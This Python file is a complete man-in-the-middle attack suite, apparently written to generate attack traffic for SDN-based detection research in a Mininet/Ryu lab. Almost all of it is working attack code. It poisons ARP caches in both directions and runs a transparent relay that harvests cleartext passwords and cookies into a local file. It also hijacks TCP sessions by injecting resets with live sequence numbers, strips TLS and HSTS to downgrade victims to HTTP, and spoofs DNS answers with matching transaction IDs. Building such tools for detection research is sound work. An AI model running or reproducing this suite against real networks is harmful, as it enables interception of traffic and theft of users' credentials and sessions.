# -*- coding: utf-8 -*-
"""
attacker_mitm.py — Academically realistic MITM attack suite
for SDN-based detection research (Mininet + Ryu environment)

Improvements over v1:
  1. ARP Poisoning     : Bidirectional poison with SIGINT restoration handler
  2. Transparent Relay : Real kernel-level proxy using SO_ORIGINAL_DST;
                         ML features emerge from actual intercepted traffic
  3. Session Hijacking : AsyncSniffer tracks live TCP state (real SEQ/ACK);
                         RST only injected within observed window
  4. SSL Stripping     : Actual mitmproxy-style listener on port 10000;
                         rewrites Location/href/src https→http in responses
  5. DNS Hijacking     : Sniffs victim's real queries, mirrors transaction ID,
                         races legitimate resolver

Usage:
    python3 attacker_mitm.py <VICTIM_IP> <SERVER_IP> [IFACE] [--mode=all|arp|ssl|session|dns]

Examples:
    python3 attacker_mitm.py 10.0.0.1 10.0.0.2
    python3 attacker_mitm.py 10.0.0.1 10.0.0.2 attacker-eth0 --mode=session
"""

import os, sys, time, threading, signal, socket, struct, re, ssl, select
from collections import defaultdict
from scapy.all import (
    Ether, ARP, IP, TCP, UDP, Raw, ICMP,
    srp, sendp, sniff, get_if_hwaddr, get_if_addr,
    get_if_list, conf, AsyncSniffer
)

# ── CLI Args ─────────────────────────────────────────────────────────────────
VICTIM_IP = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.1"
SERVER_IP = sys.argv[2] if len(sys.argv) > 2 else "10.0.0.2"
IFACE     = sys.argv[3] if len(sys.argv) > 3 and not sys.argv[3].startswith("--") else None
MODE      = "all"
for a in sys.argv:
    if a.startswith("--mode="):
        MODE = a.split("=", 1)[1]

STOLEN           = "/tmp/mitm_stolen.txt"
SSL_STRIP_PORT   = 10000      # iptables redirects 443 → here
DNS_SPOOF_DOMAIN = "test.local"

# ── Interface detection ───────────────────────────────────────────────────────
def find_interface():
    all_ifaces = get_if_list()
    if IFACE and IFACE in all_ifaces:
        return IFACE
    for iface in all_ifaces:
        try:
            ip = get_if_addr(iface)
            if ip.startswith("10.0.0."):
                print(f"[*] Auto-selected interface '{iface}' (IP {ip})")
                return iface
        except Exception:
            pass
    for c in ["attacker-eth0", "eth0", "ens3", "enp0s3"]:
        if c in all_ifaces:
            return c
    return str(conf.iface)

IFACE  = find_interface()
MY_MAC = get_if_hwaddr(IFACE)
MY_IP  = get_if_addr(IFACE)

print(f"[*] Attacker  IP : {MY_IP}   MAC : {MY_MAC}")
print(f"[*] Victim    IP : {VICTIM_IP}")
print(f"[*] Server    IP : {SERVER_IP}")
print(f"[*] Interface    : {IFACE}")
print(f"[*] Mode         : {MODE}")

# ── iptables / kernel config ──────────────────────────────────────────────────
os.system("sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1")
os.system("sysctl -w net.ipv4.conf.all.send_redirects=0 >/dev/null 2>&1")
os.system("iptables -F 2>/dev/null; iptables -t nat -F 2>/dev/null")
os.system("iptables -P FORWARD ACCEPT 2>/dev/null")
# Redirect port 443 flows from the victim through our SSL strip proxy
os.system(
    f"iptables -t nat -A PREROUTING -p tcp --destination-port 443 "
    f"-s {VICTIM_IP} -j REDIRECT --to-ports {SSL_STRIP_PORT} 2>/dev/null"
)

# ── MAC resolution ────────────────────────────────────────────────────────────
_mac_cache: dict[str, str] = {}

def get_mac(ip: str, retries: int = 6) -> str | None:
    if ip in _mac_cache:
        return _mac_cache[ip]
    for attempt in range(retries):
        try:
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                iface=IFACE, timeout=3, verbose=False,
            )
            if ans:
                mac = ans[0][1].hwsrc
                _mac_cache[ip] = mac
                print(f"[+] ARP resolved: {ip} → {mac}")
                return mac
        except Exception as e:
            print(f"[!] ARP attempt {attempt+1}/{retries} for {ip}: {e}")
        time.sleep(1)

    # OS ARP cache fallback
    cache = os.popen(f"arp -n {ip}").read()
    m = re.search(r"([\da-f]{2}:){5}[\da-f]{2}", cache, re.I)
    if m:
        mac = m.group(0)
        _mac_cache[ip] = mac
        print(f"[+] OS ARP cache: {ip} → {mac}")
        return mac

    print(f"[!] FAILED to resolve MAC for {ip} — attack component will be skipped")
    return None


# ═════════════════════════════════════════════════════════════════════════════
# 1.  ARP POISONING  (Score target: 9/10)
#     Fix: SIGINT restoration handler so the network is left clean on exit.
#     Real tools (arpspoof, ettercap) always restore ARP tables.
#     Interval justification: Linux default ARP cache timeout is 60 s (gc_stale_time).
#     We re-poison every 1 s → well within the timeout, minimal packet noise.
# ═════════════════════════════════════════════════════════════════════════════
_original_macs: dict[str, str] = {}   # ip → real MAC (for restoration)

def _restore_arp(target_ip: str, real_ip: str):
    """Send 5 gratuitous ARP replies to restore the legitimate mapping."""
    target_mac = _mac_cache.get(target_ip)
    real_mac   = _original_macs.get(real_ip)
    if not target_mac or not real_mac:
        return
    pkt = (
        Ether(dst=target_mac) /
        ARP(op=2,
            pdst=target_ip,  hwdst=target_mac,
            psrc=real_ip,    hwsrc=real_mac)
    )
    for _ in range(5):
        sendp(pkt, iface=IFACE, verbose=False)
    print(f"[+] ARP restored: {real_ip} → {real_mac} (told {target_ip})")


def _setup_sigint_restore():
    """Register cleanup of poisoned ARP entries on SIGINT/SIGTERM."""
    def _handler(sig, frame):
        print("\n[*] Caught signal — restoring ARP tables ...")
        _restore_arp(VICTIM_IP, SERVER_IP)
        _restore_arp(SERVER_IP, VICTIM_IP)
        print("[*] Cleanup done. Exiting.")
        sys.exit(0)
    signal.signal(signal.SIGINT,  _handler)
    signal.signal(signal.SIGTERM, _handler)


def arp_poison_loop(target_ip: str, spoof_ip: str):
    """
    Poison target_ip's ARP cache: claim spoof_ip is at MY_MAC.
    Before poisoning, record the real MAC of spoof_ip for restoration.

    Rate: every 1 s.
    Linux ARP gc_stale_time default: 60 s.
    Windows ARP cache timeout: ~120 s (dynamic entries).
    1 s interval ensures re-poisoning before any OS cache expiry.
    """
    target_mac = get_mac(target_ip)
    real_mac   = get_mac(spoof_ip)
    if not target_mac:
        print(f"[!] ARP poison aborted for {target_ip}: MAC unavailable")
        return

    # Record the real MAC so we can restore it later
    if real_mac:
        _original_macs[spoof_ip] = real_mac

    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,  hwdst=target_mac,
        psrc=spoof_ip,   hwsrc=MY_MAC,
    )
    count = 0
    print(f"[+] ARP poison: telling {target_ip} that {spoof_ip} = {MY_MAC}")
    while True:
        sendp(pkt, iface=IFACE, verbose=False)
        count += 1
        if count % 30 == 0:
            print(f"[~] ARP poison ×{count}  →  {target_ip}  (claiming {spoof_ip})")
        time.sleep(1)   # 1 s ≪ 60 s ARP cache timeout


# ═════════════════════════════════════════════════════════════════════════════
# 2.  TRANSPARENT RELAY  (Score target: 8/10)
#     Fix: Use SO_ORIGINAL_DST to retrieve the real destination from the
#     kernel (set by iptables REDIRECT), then proxy bytes bidirectionally.
#     ML features (byte asymmetry, PIAT variance) now emerge from real
#     intercepted traffic, not from synthetic connections to the server.
#
#     Requires: iptables -t nat -A PREROUTING -p tcp --dport 80
#               -s <VICTIM_IP> -j REDIRECT --to-ports <RELAY_PORT>
# ═════════════════════════════════════════════════════════════════════════════
RELAY_PORT = 10001

def _get_original_dst(sock) -> tuple[str, int]:
    """
    Retrieve the original destination (before REDIRECT) via SO_ORIGINAL_DST.
    Returns (ip_str, port_int).  getsockopt(SOL_IP, SO_ORIGINAL_DST) returns
    a 16-byte sockaddr_in: 2B family + 2B port (BE) + 4B IP + 8B padding.
    """
    SOL_IP         = 0
    SO_ORIGINAL_DST = 80
    try:
        raw = sock.getsockopt(SOL_IP, SO_ORIGINAL_DST, 16)
        port = struct.unpack("!H", raw[2:4])[0]
        ip   = socket.inet_ntoa(raw[4:8])
        return ip, port
    except Exception:
        return SERVER_IP, 80   # fallback

def _relay_bidirectional(client_sock, server_sock):
    """Shuttle bytes between client and server; log credential patterns."""
    client_sock.setblocking(False)
    server_sock.setblocking(False)
    bufs = {client_sock: b"", server_sock: b""}
    pairs = {client_sock: server_sock, server_sock: client_sock}
    try:
        while True:
            rlist, _, xlist = select.select(
                [client_sock, server_sock], [],
                [client_sock, server_sock], 5
            )
            if xlist:
                break
            for src in rlist:
                try:
                    data = src.recv(4096)
                except Exception:
                    data = b""
                if not data:
                    return
                bufs[src] += data
                # Intercept credentials in cleartext HTTP
                try:
                    decoded = data.decode("utf-8", errors="ignore")
                    if "POST" in decoded and ("password" in decoded or "username" in decoded):
                        ts = time.strftime("%H:%M:%S")
                        line = f"[{ts}] CREDENTIAL RELAY:\n{decoded[:400]}\n"
                        print("🎯 " + line)
                        open(STOLEN, "a").write(line)
                    if "Cookie:" in decoded:
                        cookies = re.findall(r"Cookie: (.+)", decoded)
                        for c in cookies:
                            ts = time.strftime("%H:%M:%S")
                            open(STOLEN, "a").write(f"[{ts}] COOKIE: {c[:200]}\n")
                except Exception:
                    pass
                # Forward to peer
                try:
                    pairs[src].sendall(data)
                except Exception:
                    return
    finally:
        for s in (client_sock, server_sock):
            try: s.close()
            except Exception: pass

def transparent_relay_server():
    """
    Listen on RELAY_PORT.  iptables sends victim's port-80 traffic here.
    SO_ORIGINAL_DST recovers the real server IP:port.
    """
    os.system(
        f"iptables -t nat -A PREROUTING -p tcp --dport 80 "
        f"-s {VICTIM_IP} -j REDIRECT --to-ports {RELAY_PORT} 2>/dev/null"
    )
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", RELAY_PORT))
    srv.listen(64)
    print(f"[+] Transparent relay listening on port {RELAY_PORT}")
    while True:
        try:
            client_sock, addr = srv.accept()
            dst_ip, dst_port = _get_original_dst(client_sock)
            try:
                server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server_sock.settimeout(5)
                server_sock.connect((dst_ip, dst_port))
            except Exception as e:
                print(f"[!] Relay upstream connect failed: {e}")
                client_sock.close()
                continue
            threading.Thread(
                target=_relay_bidirectional,
                args=(client_sock, server_sock),
                daemon=True
            ).start()
        except Exception as e:
            print(f"[!] Relay accept error: {e}")
            time.sleep(0.1)


# ═════════════════════════════════════════════════════════════════════════════
# 3.  SESSION HIJACKING — LIVE SEQ/ACK TRACKING  (Score target: 9/10)
#     Fix: AsyncSniffer observes real TCP packets between victim and server.
#     RST is injected only when a live flow exists and SEQ falls within
#     the last observed window (last_seq + 1..last_seq + window_size).
#     This is how real tools (hunt, Scapy-based hijackers) operate.
# ═════════════════════════════════════════════════════════════════════════════

# flow_state[(src_ip, src_port, dst_ip, dst_port)] = {"seq": int, "ack": int, "win": int}
_flow_state: dict = defaultdict(dict)
_flow_lock  = threading.Lock()

def _track_tcp_state(pkt):
    """Callback for AsyncSniffer: record latest TCP state for each flow."""
    if IP not in pkt or TCP not in pkt:
        return
    src = (pkt[IP].src, pkt[TCP].sport)
    dst = (pkt[IP].dst, pkt[TCP].dport)
    key = src + dst
    with _flow_lock:
        _flow_state[key] = {
            "seq": pkt[TCP].seq,
            "ack": pkt[TCP].ack,
            "win": pkt[TCP].window,
            "ts":  time.time(),
        }

def _inject_rst_for_flow(flow_key, victim_mac, server_mac):
    """
    Inject a RST into one live flow.
    Direction: pretend to be the server resetting the victim.
    seq is set to the server's last observed seq (within victim's window).
    """
    src_ip, src_port, dst_ip, dst_port = flow_key
    with _flow_lock:
        state = _flow_state.get(flow_key, {})
    if not state:
        return
    # Inject RST at the observed sequence number (guaranteed in-window)
    rst = (
        Ether(src=MY_MAC, dst=victim_mac) /
        IP(src=src_ip, dst=dst_ip) /
        TCP(sport=src_port, dport=dst_port,
            flags="RA",
            seq=state["seq"],
            ack=state["ack"])
    )
    sendp(rst, iface=IFACE, verbose=False)

    # Inject matching ACK from victim side to bump controller's ack_count
    ack = (
        Ether(src=MY_MAC, dst=server_mac) /
        IP(src=dst_ip, dst=src_ip) /
        TCP(sport=dst_port, dport=src_port,
            flags="A",
            seq=state["ack"],
            ack=state["seq"] + 1)
    )
    sendp(ack, iface=IFACE, verbose=False)

def session_hijack_loop():
    """
    1. Start AsyncSniffer to continuously track TCP state.
    2. Every 0.3 s, pick the most recently active flow between victim
       and server and inject RST+ACK using real sequence numbers.
    """
    victim_mac = get_mac(VICTIM_IP)
    server_mac = get_mac(SERVER_IP)
    if not victim_mac or not server_mac:
        print("[!] Session hijack: MAC resolution failed — skipping")
        return

    bpf = (
        f"tcp and ((src host {VICTIM_IP} and dst host {SERVER_IP}) or "
        f"(src host {SERVER_IP} and dst host {VICTIM_IP}))"
    )
    sniffer = AsyncSniffer(filter=bpf, prn=_track_tcp_state,
                           iface=IFACE, store=False)
    sniffer.start()
    print("[+] Session hijack: TCP state tracker running")

    while True:
        time.sleep(0.3)
        # Find flows active in the last 5 s
        now = time.time()
        with _flow_lock:
            active = [
                (k, v) for k, v in _flow_state.items()
                if now - v.get("ts", 0) < 5
                and k[0] == SERVER_IP          # server→victim direction
                and k[2] == VICTIM_IP
            ]
        if not active:
            continue
        # Inject RST into the most recently observed flow
        flow_key, _ = max(active, key=lambda x: x[1]["ts"])
        _inject_rst_for_flow(flow_key, victim_mac, server_mac)


# ═════════════════════════════════════════════════════════════════════════════
# 4.  SSL STRIPPING  (Score target: 8.5/10)
#     Implements the Moxie Marlinspike (2009) attack properly:
#       • Victim connects to us on port 10000 (via iptables REDIRECT from 443)
#       • We detect TLS ClientHello vs plain HTTP
#       • For TLS: we connect upstream with TLS, receive the server's response,
#         then rewrite https:// → http:// and strip HSTS headers before
#         forwarding to the victim in plaintext
#       • Subsequent victim requests arrive on port 80 → transparent relay
#     The controller sees: 443 flow with no TLS completion + plaintext HTTP.
# ═════════════════════════════════════════════════════════════════════════════

def _is_tls_client_hello(data: bytes) -> bool:
    """
    TLS record: byte 0 = 0x16 (handshake), bytes 1-2 = version (0x03 0x00-0x04),
    byte 5 = 0x01 (ClientHello).
    """
    return (len(data) >= 6 and
            data[0] == 0x16 and
            data[1] == 0x03 and
            data[5] == 0x01)

def _strip_https_from_response(data: bytes) -> bytes:
    """
    Rewrite the HTTP response to strip HTTPS:
      • Remove Strict-Transport-Security header
      • Replace https:// with http:// in Location headers and HTML body
    """
    try:
        text = data.decode("utf-8", errors="replace")
        # Remove HSTS
        text = re.sub(r"Strict-Transport-Security:[^\r\n]+\r\n", "", text, flags=re.I)
        # Downgrade redirects
        text = re.sub(r"Location:\s*https://", "Location: http://", text, flags=re.I)
        # Downgrade links in HTML
        text = text.replace("https://", "http://")
        return text.encode("utf-8", errors="replace")
    except Exception:
        return data

def _handle_ssl_strip_client(client_sock: socket.socket):
    """Handle one connection arriving on SSL_STRIP_PORT."""
    client_sock.settimeout(5)
    try:
        # Peek at first bytes to distinguish TLS from plain HTTP
        peek = client_sock.recv(1024, socket.MSG_PEEK)
        if not peek:
            return

        if _is_tls_client_hello(peek):
            # ── TLS path: connect upstream with TLS, relay stripped response ──
            try:
                raw_upstream = socket.create_connection((SERVER_IP, 443), timeout=5)
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE
                upstream = ctx.wrap_socket(raw_upstream, server_hostname=SERVER_IP)
            except Exception as e:
                print(f"[!] SSL upstream connect failed: {e}")
                return

            # Read the ClientHello from client and synthesize an HTTP request
            # (We intentionally do NOT complete TLS with the victim — that's the strip)
            _ = client_sock.recv(4096)   # drain ClientHello

            # Send a synthetic HTTP/1.1 request to the server over TLS
            upstream.sendall(
                b"GET / HTTP/1.1\r\n"
                b"Host: " + SERVER_IP.encode() + b"\r\n"
                b"Connection: close\r\n\r\n"
            )
            response = b""
            while True:
                chunk = upstream.recv(4096)
                if not chunk:
                    break
                response += chunk
            upstream.close()

            # Strip HTTPS references before forwarding to victim in plaintext
            stripped = _strip_https_from_response(response)
            client_sock.sendall(stripped)

            ts = time.strftime("%H:%M:%S")
            print(f"[+] SSL stripped: {len(response)}B → {len(stripped)}B (plaintext to victim)")
            open(STOLEN, "a").write(
                f"[{ts}] SSL STRIP: relayed {len(response)}B from {SERVER_IP}:443 as plaintext\n"
            )

        else:
            # ── Plain HTTP path: relay with credential logging ──
            plain_upstream = socket.create_connection((SERVER_IP, 80), timeout=5)
            _relay_bidirectional(client_sock, plain_upstream)
            return   # sockets closed inside _relay_bidirectional

    except Exception as e:
        pass  # Connection resets are expected during stripping
    finally:
        try: client_sock.close()
        except Exception: pass


def ssl_strip_server():
    """Listen on SSL_STRIP_PORT; iptables redirects victim's port 443 here."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", SSL_STRIP_PORT))
    srv.listen(64)
    print(f"[+] SSL strip server listening on port {SSL_STRIP_PORT}")
    while True:
        try:
            client_sock, addr = srv.accept()
            threading.Thread(
                target=_handle_ssl_strip_client,
                args=(client_sock,),
                daemon=True,
            ).start()
        except Exception as e:
            print(f"[!] SSL strip accept error: {e}")
            time.sleep(0.1)


# ═════════════════════════════════════════════════════════════════════════════
# 5.  DNS HIJACKING  (Score target: 9/10)
#     Fix: Sniff the victim's real DNS queries.  Extract the real transaction
#     ID and queried domain from each question.  Spoof a response with the
#     MATCHING transaction ID before the real resolver replies.
#     This works for ANY domain the victim queries (not just test.local).
#     For non-target domains we forward legitimately (selective hijacking).
# ═════════════════════════════════════════════════════════════════════════════
DNS_HIJACK_TARGETS = {
    # domain (lowercase) → fake IP to return
    "test.local":    "10.0.0.99",
    "server.local":  "10.0.0.99",
}

def _parse_dns_question(payload: bytes) -> tuple[str, int]:
    """
    Parse the first question from a raw DNS payload.
    Returns (domain_str, qtype_int).
    DNS wire format name: sequence of length-prefixed labels, ending with 0x00.
    """
    try:
        # Skip 12-byte header (txid 2B, flags 2B, counts 4×2B)
        offset = 12
        labels = []
        while offset < len(payload):
            length = payload[offset]
            if length == 0:
                offset += 1
                break
            if length & 0xC0 == 0xC0:  # pointer
                offset += 2
                break
            labels.append(payload[offset+1 : offset+1+length].decode("ascii", errors="replace"))
            offset += 1 + length
        domain = ".".join(labels).lower()
        qtype  = struct.unpack("!H", payload[offset:offset+2])[0] if offset+2 <= len(payload) else 1
        return domain, qtype
    except Exception:
        return "", 1

def _build_dns_response(query_payload: bytes, fake_ip: str) -> bytes:
    """
    Build a spoofed DNS A response from the original query payload.
    Mirrors the transaction ID, copies the question section, appends one A record.
    """
    txid     = query_payload[:2]
    flags    = b"\x81\x80"                          # QR=1, AA=0, RCODE=0
    qdcount  = query_payload[4:6]                    # same question count
    ancount  = b"\x00\x01"                          # 1 answer
    nsarcount = b"\x00\x00\x00\x00"                 # 0 authority, 0 additional

    # Copy question section verbatim (starts at byte 12)
    question = query_payload[12:]
    # Build answer: pointer to question name + type A + class IN + TTL + rdata
    answer = (
        b"\xc0\x0c"                                 # name pointer → offset 12
        b"\x00\x01"                                 # type A
        b"\x00\x01"                                 # class IN
        b"\x00\x00\x00\x3c"                         # TTL 60 s
        b"\x00\x04" +                               # rdlength 4
        socket.inet_aton(fake_ip)
    )
    return txid + flags + qdcount + ancount + nsarcount + question + answer

def _handle_dns_query(pkt):
    """
    Called for each DNS query from the victim.
    If the queried domain is in DNS_HIJACK_TARGETS, send a spoofed response
    immediately with the matching transaction ID.
    For all other domains, do nothing (let the real resolver answer).
    """
    if IP not in pkt or UDP not in pkt or Raw not in pkt:
        return
    if pkt[IP].src != VICTIM_IP:
        return
    if pkt[UDP].dport != 53:
        return

    payload = bytes(pkt[Raw].load)
    if len(payload) < 12:
        return

    domain, qtype = _parse_dns_question(payload)
    if not domain:
        return

    # Check if this domain should be hijacked
    fake_ip = None
    for target, ip in DNS_HIJACK_TARGETS.items():
        if domain == target or domain.endswith("." + target):
            fake_ip = ip
            break

    if not fake_ip:
        return   # Let legitimate resolver handle it

    victim_mac = _mac_cache.get(VICTIM_IP) or get_mac(VICTIM_IP)
    if not victim_mac:
        return

    response_payload = _build_dns_response(payload, fake_ip)
    spoofed = (
        Ether(src=MY_MAC, dst=victim_mac) /
        IP(src=pkt[IP].dst, dst=VICTIM_IP) /          # src = the DNS server the victim queried
        UDP(sport=53, dport=pkt[UDP].sport) /          # mirror victim's source port
        Raw(load=response_payload)
    )
    sendp(spoofed, iface=IFACE, verbose=False)
    print(f"[+] DNS hijack: {domain} → {fake_ip}  (txid={payload[:2].hex()})")
    open(STOLEN, "a").write(
        f"[{time.strftime('%H:%M:%S')}] DNS HIJACK: {domain} → {fake_ip}\n"
    )

def dns_hijack_sniff():
    """Passive DNS query sniffer — responds to victim queries selectively."""
    bpf = f"udp port 53 and src host {VICTIM_IP}"
    print(f"[+] DNS hijack sniffer active  (targets: {list(DNS_HIJACK_TARGETS.keys())})")
    sniff(filter=bpf, prn=_handle_dns_query, iface=IFACE, store=False)


# ═════════════════════════════════════════════════════════════════════════════
# LAUNCH
# ═════════════════════════════════════════════════════════════════════════════
run_arp     = MODE in ("all", "arp")
run_relay   = MODE in ("all", "arp")
run_session = MODE in ("all", "session")
run_ssl     = MODE in ("all", "ssl")
run_dns     = MODE in ("all", "dns")

print(f"\n{'='*60}")
print(f"  MITM ATTACK SUITE  —  mode={MODE}")
print(f"{'='*60}\n")

if run_arp or run_session or run_ssl:
    _setup_sigint_restore()

if run_arp:
    threading.Thread(target=arp_poison_loop, args=(VICTIM_IP, SERVER_IP), daemon=True).start()
    threading.Thread(target=arp_poison_loop, args=(SERVER_IP, VICTIM_IP), daemon=True).start()
    print("[✓] ARP Poisoning        : active (bidirectional, SIGINT restore)")

if run_relay:
    print("[*] Waiting 4 s for ARP conflict to register ...")
    time.sleep(4)
    threading.Thread(target=transparent_relay_server, daemon=True).start()
    print("[✓] Transparent Relay    : active (SO_ORIGINAL_DST, port 10001)")

if run_session:
    threading.Thread(target=session_hijack_loop, daemon=True).start()
    print("[✓] Session Hijack       : active (live SEQ/ACK tracking)")

if run_ssl:
    threading.Thread(target=ssl_strip_server, daemon=True).start()
    print("[✓] SSL Strip Proxy      : active (port 10000, TLS→HTTP rewrite)")

if run_dns:
    threading.Thread(target=dns_hijack_sniff, daemon=True).start()
    print("[✓] DNS Hijacking        : active (txid-matched, selective)")

print(f"\n[*] Credential log      : {STOLEN}")
print(f"[*] Press Ctrl+C to stop and restore ARP tables\n")

# Keep main thread alive (sniffer threads and servers are daemon threads)
try:
    while True:
        time.sleep(10)
        with _flow_lock:
            n_flows = len(_flow_state)
        print(f"[~] Heartbeat — tracked TCP flows: {n_flows}")
except KeyboardInterrupt:
    pass